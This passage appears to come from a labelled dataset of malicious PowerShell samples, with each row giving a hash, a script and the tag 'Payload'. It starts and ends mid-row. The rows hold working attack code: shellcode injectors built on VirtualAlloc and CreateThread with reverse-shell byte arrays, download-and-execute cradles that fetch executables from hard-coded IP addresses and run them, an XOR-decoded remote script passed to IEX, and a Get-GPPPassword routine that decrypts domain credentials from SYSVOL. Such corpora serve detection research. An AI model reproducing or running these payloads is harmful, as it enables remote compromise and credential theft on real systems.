d,0xba,0x7d,0xc2,0x0b,0xfc,0xf6,0xe1,0xec,0xb2,0xfe,0x8c,0xfe,0x22,0x0f,0xdb,0x5d,0xe4,0x10,0xf1,0xc8,0x08,0x85,0xfe,0x5a,0x5f,0x31,0xfd,0xbb,0x97,0x9e,0xfe,0xe9,0xac,0x17,0x6b,0x52,0xda,0x57,0x7b,0x52,0x1a,0x0e,0x11,0x52,0x72,0xf6,0x41,0x01,0x67,0xf9,0x5f,0x35,0x34,0x6c,0x60,0x6c,0xe9,0x27,0x08,0x92,0xd4,0x00,0x97,0x6d,0x33,0x91,0xeb,0xbb,0x7d,0xe7,0x05,0x78;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$s6m=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($s6m.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$s6m,0,0,0);for (;;){Start-sleep 60};

",Payload
3a1192b8a35398e9308e52f26aeb1640b768f07afb1f7ccc19c5026410bef66b,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x8f,0xc4,0x4b,0x2f,0xdd,0xc1,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0x83,0xe8,0xfc,0x31,0x50,0x0f,0x03,0x50,0x80,0x26,0xbe,0xd3,0x76,0x24,0x41,0x2c,0x86,0x49,0xcb,0xc9,0xb7,0x49,0xaf,0x9a,0xe7,0x79,0xbb,0xcf,0x0b,0xf1,0xe9,0xfb,0x98,0x77,0x26,0x0b,0x29,0x3d,0x10,0x22,0xaa,0x6e,0x60,0x25,0x28,0x6d,0xb5,0x85,0x11,0xbe,0xc8,0xc4,0x56,0xa3,0x21,0x94,0x0f,0xaf,0x94,0x09,0x24,0xe5,0x24,0xa1,0x76,0xeb,0x2c,0x56,0xce,0x0a,0x1c,0xc9,0x45,0x55,0xbe,0xeb,0x8a,0xed,0xf7,0xf3,0xcf,0xc8,0x4e,0x8f,0x3b,0xa6,0x50,0x59,0x72,0x47,0xfe,0xa4,0xbb,0xba,0xfe,0xe1,0x7b,0x25,0x75,0x18,0x78,0xd8,0x8e,0xdf,0x03,0x06,0x1a,0xc4,0xa3,0xcd,0xbc,0x20,0x52,0x01,0x5a,0xa2,0x58,0xee,0x28,0xec,0x7c,0xf1,0xfd,0x86,0x78,0x7a,0x00,0x49,0x09,0x38,0x27,0x4d,0x52,0x9a,0x46,0xd4,0x3e,0x4d,0x76,0x06,0xe1,0x32,0xd2,0x4c,0x0f,0x26,0x6f,0x0f,0x47,0x8b,0x42,0xb0,0x97,0x83,0xd5,0xc3,0xa5,0x0c,0x4e,0x4c,0x85,0xc5,0x48,0x8b,0xea,0xff,0x2d,0x03,0x15,0x00,0x4e,0x0d,0xd1,0x54,0x1e,0x25,0xf0,0xd4,0xf5,0xb5,0xfd,0x00,0x63,0xb3,0x69,0xf9,0x25,0x85,0x10,0x95,0xc7,0xf9,0xed,0x15,0x41,0x1f,0xa1,0x85,0x01,0xb0,0x01,0x76,0xe2,0x60,0xe9,0x9c,0xed,0x5f,0x09,0x9f,0x27,0xc8,0xa3,0x70,0x9e,0xa0,0x5b,0xe8,0xbb,0x3b,0xfa,0xf5,0x11,0x46,0x3c,0x7d,0x96,0xb6,0xf2,0x76,0xd3,0xa4,0x62,0x77,0xae,0x97,0x24,0x88,0x04,0xbd,0xc8,0x1c,0xa3,0x14,0x9f,0x88,0xa9,0x41,0xd7,0x16,0x51,0xa4,0x6c,0x9e,0xc7,0x07,0x1a,0xdf,0x07,0x88,0xda,0x89,0x4d,0x88,0xb2,0x6d,0x36,0xdb,0xa7,0x71,0xe3,0x4f,0x74,0xe4,0x0c,0x26,0x29,0xaf,0x64,0xc4,0x14,0x87,0x2a,0x37,0x73,0x19,0x16,0xee,0xbd,0x6f,0x76,0x32;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
c9e0b413853e78134e27387cdb5e013aaf70b2cc4ba49e2188f4e7f541abb3c1,"
$WC=NeW-ObjeCt SYstem.NET.WEBCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeaDErs.ADD('User-Agent',$u);$Wc.PROXY = [SYsTEM.NET.WEbREQuEst]::DeFauLtWebProxY;$wc.PrOXy.CredentIALs = [SySTEM.NEt.CRedENtiAlCache]::DEfAUltNEtwOrkCrEDentIals;$K='w1dBgDnzf!?}v6-E^/`i5.V2L|XWSRlH';$i=0;[CHar[]]$B=([cHAR[]]($Wc.DOwnloAdStRing(""http://172.16.0.2:31337/index.asp"")))|%{$_-BXOR$k[$I++%$k.LENgtH]};IEX ($b-joIN'')

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
2a286fc7bd504e5f8a8e63c9004dcdd24a5971a450a1f021814c0ec0e70809eb,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x0a,0x06,0x0a,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
956ae0450270a713afa748b49bc6d91f1dc7069ee44788063946a4e38e01c541,"
IEX ((new-object net.webclient).downloadstring('http://212.163.35.67/upload/Kernel32.ps1')); Kernel32-Update -CheckURL http://212.163.35.67/upload/st.txt -PayloadURL http://212.163.35.67/upload/robots.txt -MagicString run -StopString stopthis

",Payload
895073b7ece9c7a398de551c2321db324356f510384478281a2397b3dedb3c5c,"
(New-Object System.Net.WebClient).DownloadFile('a.pomf.cat/msicxq.exe',""$env:TEMP\best.exe"");Start-Process (""$env:TEMP\best.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b7112247d930c9c487315dbda2909ecc6893c10570c3a489f632bf052523524a,"function Get-GPPPassword {

    
    [CmdletBinding()]
    Param (
            [ValidateNotNullOrEmpty()]
            [String]
            $Server = $Env:USERDNSDOMAIN
    )
    
    
    Set-StrictMode -Version 2
    
    
    function Get-DecryptedCpassword {
        [CmdletBinding()]
        Param (
            [string] $Cpassword 
        )

        try {
            
            $Mod = ($Cpassword.length % 4)
            
            switch ($Mod) {
            '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
            '2' {$Cpassword += ('=' * (4 - $Mod))}
            '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
            
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
            
            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor() 
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        } 
        
        catch {Write-Error $Error[0]}
    }  
    
    
    function Get-GPPInnerFields {
    [CmdletBinding()]
        Param (
            $File
        )
    
        try {
            
            $Filename = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)

            
            $Cpassword = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()
    
            
            if ($Xml.innerxml -like ""*cpassword*""){
            
                Write-Verbose ""Potential password in $File""
                
                switch ($Filename) {

                    'Groups.xml' {
                        $Cpassword += , $Xml | Select-Xml ""/Groups/User/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/Groups/User/Properties/@userName"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml ""/Groups/User/Properties/@newName"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/Groups/User/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Services.xml' {  
                        $Cpassword += , $Xml | Select-Xml ""/NTServices/NTService/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/NTServices/NTService/Properties/@accountName"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/NTServices/NTService/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Scheduledtasks.xml' {
                        $Cpassword += , $Xml | Select-Xml ""/ScheduledTasks/Task/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/ScheduledTasks/Task/Properties/@runAs"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/ScheduledTasks/Task/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'DataSources.xml' { 
                        $Cpassword += , $Xml | Select-Xml ""/DataSources/DataSource/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/DataSources/DataSource/Properties/@username"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/DataSources/DataSource/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                    }
                    
                    'Printers.xml' { 
                        $Cpassword += , $Xml | Select-Xml ""/Printers/SharedPrinter/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/Printers/SharedPrinter/Properties/@username"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/Printers/SharedPrinter/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
  
                    'Drives.xml' { 
                        $Cpassword += , $Xml | Select-Xml ""/Drives/Drive/Properties/@cpassword"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml ""/Drives/Drive/Properties/@username"" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml ""/Drives/Drive/@changed"" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                    }
                }
           }
                     
           foreach ($Pass in $Cpassword) {
               Write-Verbose ""Decrypting $Pass""
               $DecryptedPassword = Get-DecryptedCpassword $Pass
               Write-Verbose ""Decrypted a password of $DecryptedPassword""
               
               $Password += , $DecryptedPassword
           }
            
            
            if (!($Password)) {$Password = '[BLANK]'}
            if (!($UserName)) {$UserName = '[BLANK]'}
            if (!($Changed)) {$Changed = '[BLANK]'}
            if (!($NewName)) {$NewName = '[BLANK]'}
                  
            
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}
                
            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose ""The password is between {} and may be more than one value.""
            if ($ResultsObject) {Return $ResultsObject} 
        }

        catch {Write-Error $Error[0]}
    }
    
    try {
        
        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
        }

        
        Write-Verbose ""Searching \\$Server\SYSVOL. This could take a while.""
        $XMlFiles = Get-ChildItem -Path ""\\$Server\SYSVOL"" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
    
        if ( -not $XMlFiles ) {throw 'No preference files found.'}

        Write-Verbose ""Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords.""
    
        foreach ($File in $XMLFiles) {
            $Result = (Get-GppInnerFields $File.Fullname)
            Write-Output $Result
        }
    }

    catch {Write-Error $Error[0]}
}
",Payload
c0c9d579ceffc7eb9bc8d92af0a4a1dc9dd75c4e91228b36d31898a8182f09f1,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xc2,0x81,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
e51bb9970be594f6a463744748f8005a35fefbb995af1140706188636c8460a3,"
$gAN = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $gAN -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x5c,0x3b,0x65,0xad,0xd9,0xe9,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x31,0x6b,0x13,0x83,0xc3,0x04,0x03,0x6b,0x53,0xd9,0x90,0x51,0x83,0x9f,0x5b,0xaa,0x53,0xc0,0xd2,0x4f,0x62,0xc0,0x81,0x04,0xd4,0xf0,0xc2,0x49,0xd8,0x7b,0x86,0x79,0x6b,0x09,0x0f,0x8d,0xdc,0xa4,0x69,0xa0,0xdd,0x95,0x4a,0xa3,0x5d,0xe4,0x9e,0x03,0x5c,0x27,0xd3,0x42,0x99,0x5a,0x1e,0x16,0x72,0x10,0x8d,0x87,0xf7,0x6c,0x0e,0x23,0x4b,0x60,0x16,0xd0,0x1b,0x83,0x37,0x47,0x10,0xda,0x97,0x69,0xf5,0x56,0x9e,0x71,0x1a,0x52,0x68,0x09,0xe8,0x28,0x6b,0xdb,0x21,0xd0,0xc0,0x22,0x8e,0x23,0x18,0x62,0x28,0xdc,0x6f,0x9a,0x4b,0x61,0x68,0x59,0x36,0xbd,0xfd,0x7a,0x90,0x36,0xa5,0xa6,0x21,0x9a,0x30,0x2c,0x2d,0x57,0x36,0x6a,0x31,0x66,0x9b,0x00,0x4d,0xe3,0x1a,0xc7,0xc4,0xb7,0x38,0xc3,0x8d,0x6c,0x20,0x52,0x6b,0xc2,0x5d,0x84,0xd4,0xbb,0xfb,0xce,0xf8,0xa8,0x71,0x8d,0x94,0x1d,0xb8,0x2e,0x64,0x0a,0xcb,0x5d,0x56,0x95,0x67,0xca,0xda,0x5e,0xae,0x0d,0x1d,0x75,0x16,0x81,0xe0,0x76,0x67,0x8b,0x26,0x22,0x37,0xa3,0x8f,0x4b,0xdc,0x33,0x30,0x9e,0x49,0x31,0xa6,0x79,0x20,0xd0,0x97,0x12,0x3e,0x23,0xcd,0xe8,0xb7,0xc5,0xa1,0xbc,0x97,0x59,0x01,0x6d,0x58,0x0a,0xe9,0x67,0x57,0x75,0x09,0x88,0xbd,0x1e,0xa3,0x67,0x68,0x76,0x5b,0x11,0x31,0x0c,0xfa,0xde,0xef,0x68,0x3c,0x54,0x1c,0x8c,0xf2,0x9d,0x69,0x9e,0x62,0x6e,0x24,0xfc,0x24,0x71,0x92,0x6b,0xc8,0xe7,0x19,0x3a,0x9f,0x9f,0x23,0x1b,0xd7,0x3f,0xdb,0x4e,0x6c,0x89,0x49,0x31,0x1a,0xf6,0x9d,0xb1,0xda,0xa0,0xf7,0xb1,0xb2,0x14,0xac,0xe1,0xa7,0x5a,0x79,0x96,0x74,0xcf,0x82,0xcf,0x29,0x58,0xeb,0xed,0x14,0xae,0xb4,0x0e,0x73,0x2e,0x88,0xd8,0xbd,0x44,0xe0,0xd8;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$TzO=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($TzO.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$TzO,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
3505fdf5ea79f4619d31c6e07bcbfc75ff579a95a47ef4b67fda02b05dda6f24,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xb6,0xc8,0x5e,0x5f,0xd9,0xed,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x50,0x0f,0x03,0x50,0xb9,0x2a,0xab,0xa3,0x2d,0x28,0x54,0x5c,0xad,0x4d,0xdc,0xb9,0x9c,0x4d,0xba,0xca,0x8e,0x7d,0xc8,0x9f,0x22,0xf5,0x9c,0x0b,0xb1,0x7b,0x09,0x3b,0x72,0x31,0x6f,0x72,0x83,0x6a,0x53,0x15,0x07,0x71,0x80,0xf5,0x36,0xba,0xd5,0xf4,0x7f,0xa7,0x14,0xa4,0x28,0xa3,0x8b,0x59,0x5d,0xf9,0x17,0xd1,0x2d,0xef,0x1f,0x06,0xe5,0x0e,0x31,0x99,0x7e,0x49,0x91,0x1b,0x53,0xe1,0x98,0x03,0xb0,0xcc,0x53,0xbf,0x02,0xba,0x65,0x69,0x5b,0x43,0xc9,0x54,0x54,0xb6,0x13,0x90,0x52,0x29,0x66,0xe8,0xa1,0xd4,0x71,0x2f,0xd8,0x02,0xf7,0xb4,0x7a,0xc0,0xaf,0x10,0x7b,0x05,0x29,0xd2,0x77,0xe2,0x3d,0xbc,0x9b,0xf5,0x92,0xb6,0xa7,0x7e,0x15,0x19,0x2e,0xc4,0x32,0xbd,0x6b,0x9e,0x5b,0xe4,0xd1,0x71,0x63,0xf6,0xba,0x2e,0xc1,0x7c,0x56,0x3a,0x78,0xdf,0x3e,0x8f,0xb1,0xe0,0xbe,0x87,0xc2,0x93,0x8c,0x08,0x79,0x3c,0xbc,0xc1,0xa7,0xbb,0xc3,0xfb,0x10,0x53,0x3a,0x04,0x61,0x7d,0xf8,0x50,0x31,0x15,0x29,0xd9,0xda,0xe5,0xd6,0x0c,0x76,0xe3,0x40,0x6f,0x2f,0xea,0x94,0x07,0x32,0xed,0xa4,0xee,0xbb,0x0b,0x94,0x40,0xec,0x83,0x54,0x31,0x4c,0x74,0x3c,0x5b,0x43,0xab,0x5c,0x64,0x89,0xc4,0xf6,0x8b,0x64,0xbc,0x6e,0x35,0x2d,0x36,0x0f,0xba,0xfb,0x32,0x0f,0x30,0x08,0xc2,0xc1,0xb1,0x65,0xd0,0xb5,0x31,0x30,0x8a,0x13,0x4d,0xee,0xa1,0x9b,0xdb,0x15,0x60,0xcc,0x